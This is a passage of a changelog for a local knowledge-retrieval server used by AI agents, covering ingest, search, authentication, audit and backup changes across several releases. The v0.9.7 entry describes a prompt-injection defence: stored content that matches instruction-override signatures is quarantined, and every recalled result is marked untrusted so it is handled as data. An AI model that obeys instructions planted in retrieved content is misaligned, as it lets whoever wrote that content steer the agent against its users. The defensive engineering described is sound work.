  `valid_to`, `observed_at`, `authority`, `lifecycle`, and typed `links`
  (`supports` / `supersedes` / `contradicts` / `references` / `derived_from`).
  `enrich_evidence` loads links a chunk participates in (both directions).
- **Consolidation (M2.3).** New `src/consolidate.rs` detection
  (`find_exact_duplicates`, `find_subject_conflicts`) + `evidence_links` table.
  `POST /consolidate/propose` (read-only detection) and
  `POST /consolidate/apply` (operator records typed links; never automatic).
- **Freshness + conflict flags (M2.4/M3.1).** Recall honors `observed_at` as a
  stable freshness tie-break. `RecallHit.conflict` is `true` when a hit has a
  `contradicts`/`supersedes` link to a current chunk.
- **Evidence metrics (M3.2).** `tests/metrics.rs` adds `stale_result_rate`,
  `current_evidence_recall`, `citation_correctness`,
  `consolidation_false_positive_rate` (unit-tested, no model needed).

#### Honest ceilings (carried into v0.9.9+)
- Evidence links live in a flat `evidence_links` table, not the
  `entities`/`relationships` KG. Graph use improves conflict *detection*
  (entity-keyed subject), not link storage.
- No automatic mutation: consolidation is review-only via `brain consolidate`
  + `apply`. No autonomous deletion, no LLM judgment.
- `as_of` point-in-time recall is derived from `source_revisions.fetched_at`;
  pre-v0.9.8 chunks (no revision linkage) are always treated as current.

---



## [1.4.1] — 2026-07-30

### Release notes

- **Bug fixes:** Entity names no longer leak into verb-pattern discovery, so a known entity can't become a spurious relationship type.
- **Improvements:** Heading hierarchy becomes graph structure: adjacent markdown sections that are both known entities get `part_of` edges.
- **Improvements:** Verb-suffix filtering rejects nouns like "maps", "data", or "example" from becoming relationship types.
- **Improvements:** First version of `brain ingest-dir --replace` (the clean-reingest flag; completed in 1.4.2).
### Engineering record
Note: this release's changes are also included cumulatively in 1.4.2.


## [1.4.0] — 2026-07-30

### Release notes

- **Improvements:** Time-aware graph: relationships gain validity intervals extracted from text ("since 2020", "until 2019"); old facts expire instead of being deleted.
- **Improvements:** Point-in-time queries: `/recall` and `/graph/traverse` accept an `at` timestamp and return only facts valid at that moment.
- **Improvements:** Budgeted context packing on `/recall` maximizes relevance, coverage, and diversity under a token budget — more signal per token of context.
- **Improvements:** Typed graph edges (`supersedes:`, `contradicts:`, `causes:`, `update:`) with bounded traversal; a new `bench eval` mode reports MRR/NDCG to catch regressions.

## [1.3.0] — 2026-07-29

### Release notes

- **Bug fixes:** MCP requests without an id (notifications) crashed the JSON-RPC handler; they are now handled.
- **Bug fixes:** Two additional panic paths eliminated (a first-line unwrap on empty vault input; a poisoned-lock crash on connector mutex contention).
- **Improvements:** Property-based test suites added for the chunker, domain normalization, and capacity classification (hundreds of generated cases each).
- **Improvements:** Fuzzing infrastructure added for the chunker, query compiler, and validators.
- **Improvements:** `/health` reports the memory-safety posture (unsafe-block count, panics caught).
- **Improvements:** Configurable worker-thread count for low-power targets.
- **Unsafe-code audit:** ten duplicated unsafe SQLite-vec registration blocks consolidated into one documented wrapper; every remaining unsafe block carries a safety comment.

## [1.2.1] — 2026-07-29

### Release notes

- **Improvements:** Authorization now uses the principal's tenant as the team context directly.
- **Improvements:** Unused auth abstractions and dead code removed, shrinking the auth surface.

## [1.2.0] — 2026-07-29

### Release notes

- **Opt-in JWT authentication** with full backward compatibility: existing opaque-token installs keep working unchanged.
- **Improvements:** OIDC discovery and JWKS endpoints published for third-party token verification; the issuer is pinned in config, never inferred from the Host header.
- **Improvements:** Key management CLI: generate, list, and prune signing keys with owner-only permissions; two keys live during rotation.
- **JWT verification with an algorithm whitelist** (RS/ES/Ed families only — `none` and HMAC rejected unconditionally) and full claim validation (issuer, audience, expiry, not-before, subject, id).
- **Token revocation and refresh-chain reuse detection:** replaying a stale refresh token burns the whole token family.
- **Scope-based authorization** (read/write/admin per team and domain), deny-by-default, returning 403 rather than 404 so existence is never leaked.

## [1.1.2] — 2026-07-29

### Release notes

- **Bearer-token comparison made constant-time** — the previous hand-rolled comparison could be short-circuited by the optimizer, reintroducing a timing oracle on token verification.

## [1.1.1] — 2026-07-29

### Release notes

- **Audit verification false-negative on migrated databases:** after upgrading, the tamper-evidence check reported tampering on a clean database (every pre-upgrade row tripped the chain walk). Verification now handles migrated rows correctly.
- **Bug fixes:** Audit writes inside an existing transaction no longer risk partial state (savepoint wrapping).
- **Bug fixes:** The metrics endpoint no longer triggers a full audit-chain scan on every scrape (result cached briefly).

## [1.1.0] — 2026-07-28

### Release notes

- **Rolling backups with integrity self-check:** periodic verified snapshots, retention of the last four copies, and backup posture on `/health`.
- **Graceful shutdown:** in-flight requests drain under a hard cap, then the write-ahead log is checkpointed so power loss can't leave un-replayed frames.
- **Memory watchdog:** sustained RSS breaches above the capacity envelope are alerted on (opt-in supervisor restart).
- **Prometheus metrics endpoint** (memory, pool, capacity, audit-chain status).
- **Tamper-evident audit chain:** every audit row is hash-linked to its predecessor; `/audit/verify` walks the chain and detects any edit.
- **Per-tenant audit scoping** enforced at the SQL layer, so a forgotten application filter cannot leak cross-tenant rows.
- **Hot token rotation:** the bearer-token file is watched and reloaded without restart; a deleted or emptied file keeps the last valid token set rather than silently clearing auth.

## [1.0.1] — 2026-07-26

### Release notes

- **Structured ingest now auto-creates entities referenced by relations** but missing from the input entity list — the canonical "vitamin d3 helps inflammation" example works as documented.
- **Bug fixes:** Ingest responses report the real database delta for entities/relations added instead of the input array length.

## [1.0.0] — 2026-07-26

### Release notes

- **Entity-name validation regression:** names containing spaces were silently rejected by a validator that ignored its own pattern — breaking documented examples; validation now matches the documented shapes.
- **Multi-domain support:** every endpoint accepts a domain via header or request field; domains are created, deleted, vacuumed, exported, and imported as first-class API operations (with a confirm guard against accidental deletion).
- **Structured ingest** (`POST /ingest`) with inline entity/relation upsert becomes the primary write path; the domain centroid recomputes after each ingest.
- **Cross-domain federated search** with rank-based merging (raw scores aren't comparable across domains) and labeled domains-searched responses; graph traversal can walk across domains.
- **Improvements:** Single-database behavior is preserved byte-for-byte by default; per-domain database files are opt-in.

## [0.9.9] — 2026-07-25

### Release notes

- **Migration rehearsal tool:** copy the live database, run the upgrade against the copy, and verify row counts, search indexes, and vector embeddings match — a dry-run for upgrades, with rollback.
- **Capacity envelopes:** published per-target limits (documents, database size, memory) surfaced on `/health`; ingest is refused with a clear over-capacity error when the envelope is exceeded, while reads always keep answering.
- **Benchmark ship gate:** the bench tool can assert memory and latency ceilings and fail the run on breach.
- **Improvements:** Every on-disk path derived from one configurable data root (relocation without touching the database path).

## [0.9.7] — "Guard" — 2026-07-20 (released)

v0.9.7 "Guard" is the security milestone: Brain Server now defends its own trust
boundary instead of assuming a trusted LAN. All work is additive (no schema break).

### Added
- **Loopback-safe bind.** The server refuses `0.0.0.0` unless `BIND_PUBLIC=1` is
  set; an invalid `BIND_HOST` now exits (exit 2) instead of silently falling
  back to all-interfaces exposure. `src/main.rs` + `src/config.rs`
  (`BIND_PUBLIC_OPT_IN`).
- **Verified webhooks** (`src/webhook.rs` + `src/handlers/webhooks.rs`):
  `POST /webhooks/{kind}` verifies the GitHub `X-Hub-Signature-256` HMAC,
  enqueues onto a bounded FIFO (`WEBHOOK_QUEUE_MAX`), and is idempotent via
  `UNIQUE(delivery_hash)` + a `webhook_seen` replay window
  (`WEBHOOK_REPLAY_SECS`). Stale/future `Date` headers are rejected. A drain
  worker (`webhook::spawn_drain_worker`) processes verified deliveries without an
  HTTP round-trip. The webhook route bypasses the bearer middleware (HMAC is its
  auth) but is verified inside the handler.
- **Append-only audit log** (`src/audit.rs`): `audit_events` table records
  hash-only events (identifiers + xxh3 hashes; never raw content, tokens, or
  secrets). `GET /audit` (operator diagnostics) + `brain audit [--kind K]
  [--limit N]`. Ingest and auth-denial events are recorded across the ingest
  paths and the auth boundary.
- **Prompt-injection quarantine** (`src/config.rs` `InjectionPolicy`):
  `contains_suspicious_pattern` hardened with zero-width/control-char
  normalization (`is_zero_width`), more instruction-override phrase signatures,
  and line-anchored structural markers (still no false positive on
  "Nervous System:"). Under `quarantine` (default) suspicious content is stored
  but `flagged = 1` and excluded from retrieval; `GET /quarantine`,
  `POST /quarantine/{id}/release`, `POST /quarantine/{id}/delete` let an operator
  review/approve/purge. `flag_if_quarantined` + `suppress_flagged_evidence`
  (retrieval-side evidence stripping unless `include_flagged`).
- **Untrusted-evidence boundary** (OWASP LLM01:2025): every `SearchResult`,
  `RecallHit`, and `Evidence` now serializes `untrusted: true`, so the consuming
  agent treats recalled content as data, never as instructions. vec0/FTS search
  gains an `include_flagged` filter (default excludes flagged rows).
- **Multi-token auth + live rotation** (`src/config.rs` `auth_tokens()`):
  `AUTH_TOKEN` / `AUTH_TOKEN_FILE` accept newline-separated tokens, all accepted
  per request — rotate or revoke by editing the token file, no restart.
- **Encrypted backup/restore** (`src/backup.rs` + `brain backup` / `brain
  restore` / `brain doctor --backup`): AES-256-GCM (key = SHA256(passphrase)),
  embedded manifest + `.sha256` checksum, secret-file bytes excluded (path+hash
  recorded only), and a `.bak` safety snapshot taken before any overwrite.
- **`openapi.yaml`**: documents `/webhooks/{kind}`, `/audit`, `/quarantine`,
  `/quarantine/{id}/release`, `/quarantine/{id}/delete`, and the `untrusted`
  field on `SearchResult` / `RecallHit` / `Evidence`.

### Honest ceilings (carried into v0.9.8+)
- The webhook replay defense is delivery-hash + replay window; the `Date`-header
  timestamp check tightens it further but is not a signed timestamp (GitHub
  sends no signed time). Treat `webhook_seen` as the primary protection.
- `contains_suspicious_pattern` is a deterministic structural screen, **not** a
  classifier. It catches known override signatures and obfuscation (zero-width
  chars) but cannot catch every adversarial input. The architectural control
  point is segregation via the `untrusted` flag, not the filter alone.
- The webhook drain worker is an audit-only stub; real ingestion-on-webhook is
  deferred to a later milestone.
- No `POST /admin/auth/revoke` HTTP route yet — revocation is file-based
  (`cp`/edit the token file).
- Encrypted backups use passphrase-derived keys (no OS keychain); that matches
  the existing `auth-token` pattern.

---



## [0.9.6] — "Bridge" — 2026-07-20 (released)

v0.9.6 "Bridge" is complete: M1 (connector contract + supervisor primitives +
stub binary), M2.1 (auth foundation: `AuthProvider` trait + `CredentialStore`
+ `GitHubAppProvider`), M2.2 (the `brain-connector-gh` binary + GitHub REST
client + issue→Markdown translation + backfill with rate-limit-aware
pagination + durable cursors), M2.3 (periodic reconcile via the existing
`/sources/reconcile` route), and M3 (the `brain connect github`, `brain sync`,
and `brain connector-status` CLI commands).

The live launchd service continues to run v0.9.6 once `install-service.sh` is
re-run; the connector binaries install alongside the server (built with
`--features connector-github` for `brain-connector-gh`).

### Architecture decisions (locked in by this release)
- **Connectors are separate binaries.** The server never links connector code
  (`bin_common/http.rs` line 4 invariant preserved). The connector binary is
  free to depend on `reqwest` + `jsonwebtoken` + `rsa` — all feature-gated on
  `connector-github`, never compiled into the server.
- **No new wire protocol.** The connector contract is three concrete
  conventions (manifest TOML + argv + JSON-lines on stdout) **plus reuse of
  the existing brain-server HTTP API** (`/ingest/markdown`, `/sources/reconcile`,
  `/connectors`). Zero new endpoint families.
- **The server is the supervisor.** `tokio::process::Command` with
  `next_backoff` restart (exponential capped at 60s, no jitter — single local
  supervisor, no herd risk).
- **Auth is a trait, not a struct.** `AuthProvider` is the unified surface;
  `StaticTokenProvider` (stub + tests), `GitHubAppProvider` (M2.1), and the
  future `OAuthProvider` (v0.9.7) all implement it.

### Added
- **`src/connector/mod.rs`** — `ConnectorManifest`, `ConnectorRow`,
  `list_connectors`, `upsert_connector`. Idempotent registration.
- **`src/connector/supervisor.rs`** — `next_backoff` (overflow-safe exponential
  capped at 60s), `spawn_once` (tokio::process with kill_on_drop).
- **`src/connector/auth/mod.rs`** — `AuthProvider` trait + `AccessToken` (with
  redacted `Display`) + `StaticTokenProvider`.
- **`src/connector/auth/store.rs`** — `CredentialStore<T>`: per-connector JSON
  config at `~/.config/brain-server/connectors/{kind}-{instance}.json` (0600).
  Atomic save via `std::fs::rename`. No at-rest encryption beyond filesystem
  permissions + FileVault/LUKS — matches the existing `auth-token` pattern.
- **`src/connector/auth/github_app.rs`** — `GitHubAppProvider`: full JWT (RS256)
  → installation-token flow. Token-level repo scoping via the optional
  `repositories` body field (the DoD-1 mechanism). In-memory single-slot
  cache refreshed within `REFRESH_SKEW=60s` of expiry.
- **`src/connector/github/client.rs`** — `GitHubClient`: wraps reqwest with
  GitHub-required headers + rate-limit sleep (capped at 60s) + Link-header
  pagination.
- **`src/connector/github/translate.rs`** — `translate_issue`: renders each
  issue as YAML frontmatter + Markdown body. Source URI:
  `github://{owner}/{repo}/issues/{N}`. Stable across edits, unique per issue.
- **`src/connector/github/mod.rs`** — `backfill_issues_for_repo` +
  `reconcile_github_sources` + cursor store (`connector_checkpoints` table).
- **`src/bin/brain-connector-stub.rs`** — M1 reference connector (~140 LOC).
  Spawns, parses argv, emits JSON-lines, ingests one doc, exits 0.
- **`src/bin/brain-connector-gh.rs`** — the real GitHub connector (~280 LOC).
  Loads config, opens checkpoint DB, fetches installation token, backfills
  each configured repo, reconciles.
- **`src/lib.rs`** — new library target exposing only `pub mod connector`.
  Server modules stay private to `src/main.rs`.
- **Migration**: additive `connectors` + `connector_checkpoints` tables.
  Idempotent (`CREATE TABLE IF NOT EXISTS`). No data migration.
- **`GET /connectors`** route + `ConnectorRow` OpenAPI schema.
- **`brain connect github`** CLI: writes connector config (0600, atomic) from
  `--app-id`, `--install-id`, `--key-file`, `--repo` argv.
- **`brain sync [github]`** CLI: spawns `brain-connector-gh` with the right
  argv; surfaces its JSON-lines event stream to the operator.
- **`brain connector-status`** CLI: lists every registered connector.

### Changed
- `Cargo.toml`: `version` 0.9.5 → 0.9.6. New optional deps `jsonwebtoken`
  (`rust_crypto` + `use_pem` features) + `reqwest` (`rustls` + `json` +
  `blocking`), both feature-gated on `connector-github`. New `[[bin]]`
  `brain-connector-stub` (always built) + `brain-connector-gh` (requires
  `connector-github`). New dev-deps `rsa` + `rand` + `base64` (for JWT-shape
  tests).
- `openapi.yaml`: bumped to 0.9.6; added `/connectors` route +
  `ConnectorRow` schema.
- `test_migration_schema_contract`: extended to assert the two new tables.
- `test_openapi_covers_routes`: extended with `/connectors`.

### Removed
- _Nothing._ The rerank tier removal landed in v0.9.5 (`3fcac72`); this
  release is additive.

### Honest ceilings (not bugs)
- **Issues only.** PRs are filtered out at translate time (PRs are issues
  with a `pull_request` field); their dedicated backfill lands in v0.9.7.
- **No comments.** Each issue's body is ingested as one doc; threaded
  comments land in a separate sub-resource cursor later.
- **No streaming JSON parser.** Each page is fully buffered. Fine for
  issues/PRs/discussions; revisit if wiki pages exceed 1 MB on the 4 GB
  Jetson.
- **`AuthProvider` is sync.** The connector is a batch process — async here
  would buy nothing. Revisit if a future connector needs streaming auth.
- **Rate-limit sleep capped at 60s** (not the full `X-RateLimit-Reset`
  window). Prevents silent hour-long wedges; surfaces as a hard error on
  the second attempt.
- **No at-rest encryption** in `CredentialStore`. Filesystem permissions +
  FileVault/LUKS are the only at-rest protection. Matches the `auth-token`
  pattern; revisit if multi-tenant.
- **Webhook ingress is deferred.** Reconcile alone satisfies DoD-2; the
  webhook path lands in v0.9.7+ for near-real-time sync.
- **Single-shell restart loop** with `kill_on_drop`. Graceful drain lands
  with v0.9.7+ `brain disconnect`.
- **No `brain connector doctor`.** `brain status` + `brain connector-status`
  cover the same ground for v0.9.6.

### Context7-verified facts cited inline
- GitHub REST API (`/websites/github_en_rest`, 2026-07-20):
  `X-GitHub-Api-Version: 2026-03-10` is current; installation tokens support
  the `repositories` body field for per-repo scoping.
- Standard Webhooks spec (`/standard-webhooks/standard-webhooks`, 2026-07-20):
  constant-time compare + idempotency key + timestamp tolerance for webhook
  signature verification (deferred to v0.9.7 webhook ingress).
- RustCrypto hashes (`/rustcrypto/hashes`, 2026-07-20): `sha2::Sha256` +
  `hmac::Hmac<Sha256>` is the canonical HMAC-SHA256 path for webhook
  verification (deferred to v0.9.7).
- `jsonwebtoken` (`/keats/jsonwebtoken`, 2026-07-20): RS256 +
  `EncodingKey::from_rsa_pem` (requires `use_pem` feature) is the canonical
  JWT-signing path for GitHub Apps.

---



## [0.9.5] — "Inspect" — 2026-07-19 (released)

v0.9.5 "Inspect" is complete: M1 (structured query contract), M2 (evidence
quality), and M3 (product interface) all shipped 2026-07-19 (M1: `a46c7ab`,
`ade13d1`, `28309f9`; M2: `0b10b45`, `9a4ce75`; M3: Agent 20). The live
launchd service runs v0.9.5.

### Removed
- **Rerank tier (`--features rerank` + `fastembed-rs` BGE cross-encoder), deleted in
  `3fcac72`.** It pegged the M1 CPU and blew the 8s recall timeout, and was too heavy
  for the Jetson edge GPU. The hybrid `vec0` KNN + FTS5 BM25 + RRF + PRF retrieval is
  the right ceiling for this edge-only deployment. `/stats` now reports
  `rerank_status: "off"`. The `rerank_score` / `rerank_truncated` / `rerank_ms` API
  fields are retained (always `null` / `false` / `0`) for contract stability.
  The `rerank` Cargo feature flag and `src/search/rerank.rs` were deleted entirely,
  not stubbed — to re-add the tier, revert `3fcac72` on a CUDA-GPU deployment.

### Added (v0.9.5 M1 — "Inspect")
- **Structured query document (`QueryDoc`).** Both `/search` and `/recall`
  lower their params into one versioned `QueryDoc` (`src/search/query.rs`),
  so they share a single lexical compiler + validation path. A plain-text
  query remains backwards compatible.
- **Lexical controls via `LexSpec`.** `{ terms, phrases, exclude, code }` is
  compiled into a **validated, FTS5-quoted** MATCH string. Replaces the old
  unvalidated raw-`lex` passthrough (which returned opaque SQLite errors on
  bad input). Caller input can no longer inject FTS5 operators. `/recall`
  accepts `lex` as either a bare string (`{"lex":"foo"}`) or a full `LexSpec`
  object; `/search` (GET) takes a comma-separated `lex` string mapped to one
  term.
- **Multi-source OR scoping.** `SearchFilters.sources: Vec<String>` applies
  `source IN (?,?…)` in both `vec0_knn` and `fts_search`; the legacy single
  `source=` is still honored when `sources` is empty. `/search` takes
  comma-separated `sources=a,b`.
- **`intent` is provenance-only.** Recorded into telemetry/provenance; never
  injected as a search term and never relaxes `since`/`source`/`domain`
  filters (verified by code trace).

### Changed
- `/search` and `/recall` responses now reflect the compiled lexical query
  and OR source scope in their `explain`/`query_plan` blocks.

### Known ceilings (not bugs)
- `profile` field is accepted but passthrough (no rerank/weighting yet).
- `LexSpec` covers terms/phrases/exclusions/exact-code only — no `NEAR`,
  prefix `*`, or column filters.
- `/search` GET takes a flat `lex` string, not a nested `LexSpec`; the full
  structured form is on `/recall` POST and will back the M3 `brain query` CLI.

### Added (v0.9.5 M2 — "Evidence quality")
- **Structured `Evidence` on every hit.** `SearchResult`/`RecallHit` now
  carry `evidence` = `{ text, line_start, line_end, heading_path,
  source_uri, revision_id, highlights }`. `text` is a verbatim substring of
  the chunk; `highlights` are byte-offset ranges *within that window* (the
  server never injects HTML). `source_uri`/`revision_id` link to the exact
  source revision (NULL for pre-v0.9.4 chunks without source linkage).
  Populated by one batched LEFT JOIN (`enrich_evidence`), not N queries.
- **`GET /get/{id}` and `POST /multi-get`** now return `source_uri` +
  `revision_id`; `multi-get` bound raised to 1000 (was hardcoded 100).
- **`explain` redaction + reproducibility.** `/search?explain=true` redacts
  full `content` from results (only the bounded `evidence.text`/`snippet`
  serialize) and adds `k`/`source`/`domain`/`since`/`profile` to
  `query_plan`. A `MAX_EXPLAIN_BYTES` (64 KiB) hard cap falls back to the
  summary if exceeded. Snippet window bounded by `MAX_SNIPPET_CHARS` (240)
  + `SNIPPET_CONTEXT_CHARS` (60), centralized in `config.rs`.
- **`config.rs`**: added `MAX_SNIPPET_CHARS`, `SNIPPET_CONTEXT_CHARS`,
  `MAX_EXPLAIN_BYTES`, `MAX_MULTI_GET`.

### Added (v0.9.5 M3 — "Product interface")
- **`brain query` on the structured contract.** `brain query "<q>"` now POSTs
  `POST /recall` with a v0.9.5 `QueryDoc`: repeatable `--phrase`/`--exclude`/
  `--code` (lowered into `LexSpec`), multi-`--source` OR scope, `--intent`,
  `--profile`, `--since`, `--k`, `--explain`. Back-compat bare-string queries
  still work.
- **`brain get <id>` implemented** against the existing `GET /get/{id}` route
  (M2.3 ceiling closed). Prints title/source/heading/line span/`source_uri`/
  `revision_id` + content; 404 → "no chunk with id".
- **`brain explain` unified** on `/recall`'s `provenance`/`telemetry` envelope
  (closes the M2.2 split where `/search` used `query_plan` and `/recall` used
  `telemetry`).
- **`GET /openapi.yaml`** serves the canonical OpenAPI 3.0 contract (embedded
  via `include_str!`, so it ships with the binary). `openapi.yaml` updated to
  v0.9.5: all 23 routes + `QueryDoc`/`LexSpec`/`Evidence`/`Chunk`/`QueryPlan`/
  `SearchTelemetry` schemas.
- **`examples/client_example.rs`** — a typed client over the shared dependency-
  free HTTP client, demonstrating a structured `QueryDoc` roundtrip.
- **MCP tool schema** (`mcp` server): `brain_search`/`brain_recall`/
  `brain_ingest` updated to the v0.9.5 `QueryDoc`; both search tools now POST
  `POST /recall` via one shared body-lowerer.
- **API versioning + deprecation.** Every response carries `X-Api-Version:
  <semver>`; deprecated `POST /add` and `GET /search` return an RFC 8594
  `Deprecation: version="0.9.5"` header. Policy + migration mapping documented
  in `API_CONTRACT.md` §Versioning & deprecation.
- **`test_openapi_covers_routes`**: asserts every route registered in
  `build_app` appears in `openapi.yaml`.

### Known ceilings (carried into v0.9.6)
- `highlights` over the *full* chunk still require `GET /get/{id}`; `brain get`
  returns full content so a client can compute its own.
- `profile` accepted but passthrough (no rerank weighting yet).
- OpenAPI is hand-written (no code-gen dep); the coverage test guards drift.

---



## [0.9.4] — "Sources" — 2026-07-17 (released)

The source-lifecycle release. Every knowledge chunk now carries provenance:
 the canonical `source` it came from (a vault file, a manual memory, …) and
 the immutable `source_revision` snapshot of the exact content version. A
 vault file edited on disk produces a new revision atomically; a deleted file
 is detected by `brain reconcile` and its chunks swept from retrieval. Plus a
 bug-fix sweep that landed while the feature work was in flight.

### Added
- **Canonical sources + revisions (M1+M2).** Two new tables — `sources`
  (stable identity per external document, keyed by canonical URI; kind-scoped
  as `vault` / `manual`) and `source_revisions` (immutable snapshots;
  supersession chain). Two new columns on `knowledge` (`source_id`,
  `revision_id`) link every chunk to its source + revision. Existing 430-doc
  DB left NULL — pre-v0.9.4 chunks keep working; new ingests pick up source
  linkage. Idempotent additive migration (CREATE IF NOT EXISTS + column
  guards), guarded by `test_migration_schema_contract`.
- **`/ingest/markdown` + `/ingest/memory` now write source linkage** inside
  their existing transactions. Vault ingests use the canonical file path as
  the URI; manual memories use `manual://{content_hash}` (no PII; stable
  across re-ingests; immune to vault reconcile because reconcile is
  kind-scoped). The unchanged-file no-op path backfills source linkage for
  pre-v0.9.4 chunks on first v0.9.4 re-ingest — so re-ingesting an existing
  vault retroactively links its chunks without rescanning.
- **`POST /sources/reconcile`** — body `{kind, live_uris: [string]}`. The
  server retires any active source of `kind` whose URI is NOT in the live
  set, sweeping its chunks from retrieval (vec0 + FTS + knowledge rows) and
  tombstoning the source + active revision. The server does NOT walk the
  filesystem — the caller supplies the live set, preserving the
  client/server boundary. Bounded `MAX_LIVE_URIS = 50_000`.
- **`DELETE /sources/{id}`** — retires a single source by id. 404 if absent.
- **`brain reconcile <path> [--kind vault] [--dry-run]`** — walks the path
  with the SAME walker + `.brainignore` semantics + canonicalized-absolute-path
  URI form that `brain ingest-dir` uses, so URIs match what's stored. POSTs
  the live set to `/sources/reconcile`. Recommended after every
  `brain ingest-dir <vault>` to detect deletes / renames.
- **`brain source-delete <id>`** — companion CLI for the DELETE route.
- **`scripts/install-service.sh` now installs the operator CLIs**
  (`brain`, `mcp`, `bench`) alongside `brain-server`, with `--features bench`
  so the `bench` binary compiles. Previously only the server binary was
  installed, so `brain doctor` / `brain status` were not on `$PATH`.
- **macOS `com.apple.provenance` xattr cleanup** in `install-service.sh`.
  Sonoma+ tags every newly-written executable with this xattr and Gatekeeper
  SIGKILLs the process on first exec (`Killed: 9`, exit 137). The script now
  strips it after each copy so freshly-installed binaries actually run.

### Fixed
- **Character-preservation warranty for the ingest pipeline.** Markdown
  files whose name OR content contain special characters — `#`, `-`, `_`,
  spaces, parens, brackets, unicode, backticks, code fences with `#`-comments,
  hash-delimiters inside string literals — now round-trip verbatim through
  the chunker → DB → source-linkage → dedup path. Filenames with special
  chars are preserved byte-for-byte as `sources.uri` and
  `knowledge.source_path`; content is preserved in `knowledge.content`;
  per-chunk `content_hash` is stable across re-ingest. The chunker treats
  `#`-lines inside a code fence as code, NOT as headings (so a Python file
  with `#`-comments is not mistaken for a heading hierarchy). Renamed the
  misleading `MAX_CHUNK_CHARS` to `MAX_CHUNK_BYTES` (it was always bytes).
  Verified by `test_special_characters_survive_ingest_pipeline`.
- **`brain --help` lost its 2-space indentation.** The `print_usage` string
  used `\n\` line continuations, which Rust interprets as "newline + strip
  leading whitespace on next line" — so every subcommand rendered flush-left.
  Switched to a raw string literal (`r#"..."#`) which preserves the intended
  2-space indentation and lets embedded `"` survive without escaping.
- **`/stats` reported a stale `embeddings` count** (e.g. `2` on a 430-doc
  corpus). The handler counted the legacy `embeddings` table, which has been
  frozen read-only since v0.9.0 — all post-v0.9.0 vectors live in the
  `vec_knowledge` vec0 table. `/stats` now counts `vec_knowledge`, so the
  number reflects the live index (backfilled legacy + new ingests).
- **`brain`, `mcp`, and `bench` CLIs returned `401` on every authenticated
  route** (`/search`, `/stats`, `/recall`, `/ingest/*`, `/sources/*`). The
  shared HTTP client in `src/bin_common/http.rs` had no auth support;
  `get()`/`post()` did not accept headers, so no `Authorization: Bearer` was
  ever sent. The client now takes an optional `bearer: Option<&str>`, and
  each binary resolves the token via `BRAIN_TOKEN_FILE` → `BRAIN_TOKEN` →
  `~/.config/brain-server/auth-token` (mirroring the server's
  `AUTH_TOKEN_FILE` → `AUTH_TOKEN` ladder). Zero-config for the common
  install — same file the launchd plist already sources.
- **`brain-server --version` silently started the server.** `main.rs` did no
  argv inspection, so any flag was ignored and execution fell through to
  `bind()`. If the port was free, the process became a foreground server
  attached to the caller's shell. An argv guard now runs before any side
  effect (tracing init, model load, socket bind): `--version`/`-V` prints and
  exits 0; `--help`/`-h` prints brief usage and exits 0; unknown `-`-prefixed
  flags exit 2 instead of launching the server.
- **`brain --version` was rejected** as an unknown subcommand (`error:
  unknown subcommand '--version'`, exit 2). Added a `-V`/`--version` arm to
  the existing command matcher; both `brain` and `brain-server` now report
  `env!("CARGO_PKG_VERSION")` and exit 0.

### Changed
- **`write_markdown_ingest` takes a new `raw_content: &str` parameter** (the
  original payload, frontmatter + body) so the source revision hash reflects
  ANY change in the file, not just body changes that survive frontmatter
  stripping. Now 8 args — `#[allow(clippy::too_many_arguments)]` with a
  comment explaining why bundling into a struct is pure ceremony for a
  private fn with one prod caller.
- **CI now runs `cargo clippy --all-targets --features bench -- -D warnings`
  and `cargo test --all-targets --features bench`.** The `bench` binary is
  feature-gated and was previously untested upstream.
- **Chunker rewritten on top of `pulldown-cmark` 0.13** (Context7-verified
  2026-07-17). The pre-v0.9.4 chunker was a hand-rolled line-scanner that
  mis-handled CommonMark constructs: setext headings (`Foo\n===`), indented
  code blocks (4-space indent), blockquotes, lists, GFM tables. The new
  chunker walks `pulldown-cmark`'s event stream with `into_offset_iter()` and
  slices source bytes verbatim from the union of event ranges, so every
  container markup character (`>`, `-`, `|`, fence markers) survives intact.
  Heading detection is now CommonMark-spec-driven (handles ATX, setext, and
  any GFM-tagged heading), `#`-comments inside code blocks are no longer
  mistaken for headings, and indented code blocks are no longer mistaken for
  prose. New dependency: `pulldown-cmark = { version = "0.13",
  default-features = false }` (we use only the parser; the `html`/`getopts`
  default features are dropped). pulldown-cmark is `#![forbid(unsafe_code)]`
  upstream; we keep our `#![deny(unsafe_code)]`.
- **Chunker warranty** (carryover from earlier v0.9.4 work): every byte of
  input text — including `#`-comments inside code fences, unicode, backticks,
  brackets, dashes, hash-delimiters inside string literals — survives intact
  into the chunk `text`. The only lines consumed (not buffered verbatim) are
  ATX and setext headings; their text becomes the chunk's `heading_path`
  breadcrumb instead. The misleading `MAX_CHUNK_CHARS` constant was renamed
  `MAX_CHUNK_BYTES` (it was always bytes — `str::len`). Verified by
  `test_special_characters_survive_ingest_pipeline` plus 6 new per-construct
  tests covering setext, indented code, blockquote, list, GFM table, and
  `#`-in-code-fence.

### Tests
- **130 passed, 1 ignored** (was 113 at v0.9.3). Delta: +7 from
  `sources::tests::*` now reachable via `mod sources;`, +4 v0.9.4 vault/memory
  source-linkage integration tests, +1 character-preservation warranty test,
  +5 new CommonMark chunker tests (setext, indented code, blockquote, list,
  GFM table, `#`-in-code-fence) replacing the 1 removed `parse_heading` test.
- New `test_migration_schema_contract` asserts the full table/column contract
  after `run_migration` and verifies the ingest → FTS5 → vec0 roundtrip. This
  is the single test that catches a broken migration before it reaches the
  live DB.

### Known limitations
- Measured RSS / latency / recall numbers on 4 GB ARM and the ≥100 judged-
  query corpus remain **PENDING** a hardware run (inherited from v0.9.3).
- `pulldown-cmark` itself does not handle Obsidian-specific wikilink syntax
  (`[[target]]`) at the structural level — it emits them as Text events, which
  our chunker passes through verbatim. The `vault::parse_wikilinks` post-pass
  extracts them as `references` KG edges separately; the chunk text is
  unchanged.

---



## [0.9.3] — "Calibrate" — 2026-07-11 (released)

Named release formalizing the retrieval-calibration work that shipped in v0.9.1.
No new runtime code: the three Calibrate exit criteria — **PRF executes**, **rerank
has a candidate window**, and **the benchmark is reproducible** — are all already
satisfied by v0.9.1 and are guarded by dedicated tests. This release exists to
make the calibration state a named, reviewable checkpoint before the source-
lifecycle work in v0.9.4.

### Calibration state (verified, not newly added)
- **PRF executes.** The v0.9.1 fix replaced an unreachable `0.3` RRF-score
  threshold with a deterministic, calibrated gate (`prf_should_expand`): expansion
  fires only when the top pass-1 result appears in **both** the dense and lexical
  lists within a bounded rank. Guarded by
  `prf_expands_only_on_cross_retriever_agreement`.
- **Rerank has a candidate window.** `RERANK_CANDIDATES = 30`; retrieval over-
